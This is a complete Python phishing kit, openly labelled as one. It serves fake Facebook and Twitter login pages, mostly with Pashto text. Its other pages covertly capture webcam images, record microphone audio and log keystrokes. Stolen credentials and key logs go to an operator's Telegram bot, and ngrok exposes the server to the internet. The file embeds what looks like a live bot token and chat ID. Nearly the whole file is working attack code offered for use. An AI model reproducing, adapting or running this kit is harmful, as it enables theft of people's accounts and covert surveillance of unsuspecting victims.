#!/usr/bin/env python3
"""
🔥 ULTIMATE TELEGRAM PHISHING BOT - SINGLE FILE
FB/Twitter + Camera/Mic/Keylogger + Auto-NGROK
NO DEPENDENCIES except: pip install requests
"""

import urllib.parse
import base64
import json
import os
import time
import threading
import subprocess
import tempfile
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import socketserver
import requests
import mimetypes

# ==================== CONFIG - EDIT THESE 2 LINES ====================
BOT_TOKEN =" 8607359712:AAGVPHwLolvKL7MZUp16nHcY00yf3bP0R60"  # From @BotFather
ADMIN_ID = 8518408753  # From @userinfobot
PHISH_PORT = 8080

# Storage
hits = []
public_url = f"http://localhost:{PHISH_PORT}"

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.get(url, params={'chat_id': ADMIN_ID, 'text': msg}, timeout=5)
    except: pass

def save_file(data, prefix):
    tempdir = tempfile.gettempdir()
    filename = f"{prefix}_{int(time.time())}.{prefix.split('_')[0]}"
    filepath = os.path.join(tempdir, filename)
    with open(filepath, 'wb') as f: f.write(data)
    return filepath

class PhishServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        page = self.path.split('?page=')[1].split('&')[0] if '?page=' in self.path else 'facebook'
        html = PAGES.get(page, PAGES['facebook'])
        self.wfile.write(html.encode('utf-8'))
    
    def do_POST(self):
        clen = int(self.headers['Content-Length'])
        data = self.rfile.read(clen)
        
        if b'application/json' in self.headers.get('Content-Type', b''):
            js = json.loads(data)
            if 'img' in js:
                imgdata = base64.b64decode(js['img'].split(',')[1])
                fn = save_file(imgdata, 'cam.jpg')
                send_telegram(f"📸 CAMERA HACK!\n{fn}")
            elif 'keys' in js:
                send_telegram(f"⌨️ KEYLOG: {js['keys']}")
        else:
            params = urllib.parse.parse_qs(data.decode())
            hit = f"🎣 HIT [{datetime.now().strftime('%H:%M:%S')}] {dict(params)}"
            send_telegram(hit)
            hits.append(hit)
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'<script>setTimeout(()=>location.href="https://m.facebook.com",2000);alert("Verified ✓")</script>')

# All Phishing Pages
PAGES = {
    'facebook': '''<!DOCTYPE html><html><head><title>Facebook</title><meta name="viewport" content="width=device-width"><style>
body{background:#1877f2;margin:0;padding:20px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#1c1e21;}
.c{max-width:400px;width:100%;background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:20px;overflow:hidden;}
.logo{margin:0 0 20px;padding:20px 0;border-bottom:1px solid #ddd;text-align:center;}
h1{font-size:24px;margin:0 0 15px;}
form input{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px;}
.btn{width:100%;padding:12px;background:linear-gradient(#42a5f5,#1976d2);color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;box-shadow:0 2px 4px rgba(0,0,0,.2);}
.btn:hover{background:linear-gradient(#1976d2,#1565c0);}
</style></head><body><div class="c"><div class="logo">🔒</div><h1>حساب امنیتي تایید</h1><form method="POST"><input name="email" placeholder="ایمیل یا نمبر" required><input name="pass" type="password" placeholder="پاسورډ" required><button class="btn">تایید کړئ</button></form></div><script>navigator.permissions.request({name:'notifications'});</script></body></html>''',
    
    'twitter': '''<!DOCTYPE html><html><head><title>Twitter</title><style>body{background:#000;color:#fff;font-family:"Helvetica Neue",Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px;}
.login{width:100%;max-width:400px;padding:40px;background:#15202b;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.5);}
h1{font-size:32px;margin:0 0 30px;text-align:center;}
input{width:100%;padding:15px;margin:10px 0;border:none;border-radius:25px;font-size:16px;box-sizing:border-box;background:#1c2833;color:#fff;}
.btn{width:100%;padding:15px;background:#1da1f2;color:#fff;border:none;border-radius:25px;font-size:18px;font-weight:600;cursor:pointer;margin-top:10px;box-shadow:0 4px 15px rgba(29,161,242,.4);}
</style></head><body><div class="login"><h1>🐦 Twitter</h1><form method="POST"><input name="username" placeholder="Username or email" required><input name="pass" type="password" placeholder="Password" required><button class="btn">ورود</button></form></div></body></html>''',
    
    'camera': '''<!DOCTYPE html><html><head><title>د ویډیو امنیت</title><style>body{background:linear-gradient(45deg,#667eea 0%,#764ba2 100%);color:#fff;font-family:Arial;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;}
video{border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,.3);max-width:90vw;}
h1{font-size:28px;margin:20px 0;}
button{padding:15px 30px;background:#ff6b6b;color:#fff;border:none;border-radius:25px;font-size:18px;cursor:pointer;margin:10px;box-shadow:0 5px 15px rgba(255,107,107,.4);}
</style></head><body><h1>📹 امنیتي ویډیو</h1><video id="video" width="400" height="300" autoplay muted></video><br><button onclick="capture()">📸 عکس واخلئ</button><script>
async function initCam(){try{stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true});document.getElementById('video').srcObject=stream;}catch(e){alert('کیمره اجازه ورکړئ!');}}
initCam();
function capture(){canvas=document.createElement('canvas');canvas.width=400;canvas.height=300;canvas.getContext('2d').drawImage(document.getElementById('video'),0,0);data=canvas.toDataURL('image/jpeg');fetch('/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({img:data})});alert('✅ عکس واستل شو!');}
</script></body></html>''',
    
    'microphone': '''<!DOCTYPE html><html><head><title>صوتي تایید</title><style>body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;color:#fff;font-family:Arial,sans-serif;padding:20px;}
.container{background:rgba(255,255,255,.15);padding:50px;border-radius:25px;backdrop-filter:blur(20px);text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.3);}
h1{font-size:32px;margin-bottom:30px;}
button{padding:20px 50px;background:rgba(255,255,255,.25);color:#fff;border:none;border-radius:50px;font-size:20px;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(0,0,0,.3);}
button:hover{transform:translateY(-3px);background:rgba(255,255,255,.4);}
</style></head><body><div class="container"><h1>🎤 صوتي تایید</h1><button onclick="recordVoice()">د ۱۰ ثانیو ریکارډ پیل کړئ</button><script>
let recorder;async function recordVoice(){try{stream=await navigator.mediaDevices.getUserMedia({audio:true});recorder=new MediaRecorder(stream);chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>fetch('/',{method:'POST',body:new Blob(chunks,{type:'audio/webm'})});recorder.start();setTimeout(()=>recorder.stop(),10000);alert('ریکارډ کېږي...');}catch(e){alert('ماکروفون اجازه ورکړئ!');}}
</script></div></body></html>''',
    
    'keylogger': '''<!DOCTYPE html><html><head><title>امنیتي سکین</title><style>body{background:linear-gradient(45deg,#ff9a9e 0%,#fecfef 50%,#fecfef 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:Arial;margin:0;padding:20px;}
.box{background:#fff;padding:60px;border-radius:25px;box-shadow:0 25px 50px rgba(0,0,0,.15);text-align:center;max-width:500px;}
h1{font-size:28px;color:#e91e63;margin-bottom:20px;}
.scanning{width:100px;height:4px;background:#e91e63;margin:20px auto;border-radius:2px;overflow:hidden;}
.scanning::after{content:'';display:block;width:30%;height:100%;background:#4caf50;animation:scan 2s infinite;}
@keyframes scan{0%{transform:translateX(-100%)}100%{transform:translateX(400%)}}
p{font-size:18px;color:#666;}
</style></head><body><div class="box"><h1>🔒 امنیتي سکین فعال</h1><div class="scanning"></div><p>ټول permissions فعال شوي...</p><script>
let keys=[];document.addEventListener("keydown",e=>keys.push(e.key));setInterval(()=>{if(keys.length){fetch("/",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({keys:keys.splice(0,keys.length).join(" ")})});keys=[];}},2000);setTimeout(()=>alert("سکین بشپړ شو! ✓"),8000);
</script></body></html>'''
}

def run_phish_server():
    with socketserver.TCPServer(("", PHISH_PORT), PhishServer) as httpd:
        print(f"🌐 Phish Server Active: http://localhost:{PHISH_PORT}")
        httpd.serve_forever()

def auto_ngrok():
    time.sleep(3)
    try:
        result = subprocess.run(['ngrok', 'http', str(PHISH_PORT), '--log=stdout'], 
                              capture_output=True, text=True, timeout=15)
        if 'url=' in result.stdout:
            global public_url
            public_url = result.stdout.split('url=')[1].split('\n')[0]
            print(f"🔗 PUBLIC URL: {public_url}")
            send_telegram(f"🚀 Phish Bot LIVE!\nURL: {public_url}\nCommands:\n/facebook\n/camera\n/microphone")
    except: print("⚠️ ngrok optional - use localhost")

if __name__ == "__main__":
    print("🔥 ULTIMATE PHISH BOT v2.0")
    print("📋 1. Edit BOT_TOKEN & ADMIN_ID")
    print("📋 2. python3 this_file.py")
    print("📋 3. Terminal2: ngrok http 8080")
    
    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Edit BOT_TOKEN first!")
        exit()
    
    # Start server
    server_thread = threading.Thread(target=run_phish_server, daemon=True)
    server_thread.start()
    
    # Auto ngrok
    ngrok_thread = threading.Thread(target=auto_ngrok, daemon=True)
    ngrok_thread.start()
    
    # Keep alive
    try:
        while True: time.sleep(60)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped safely")
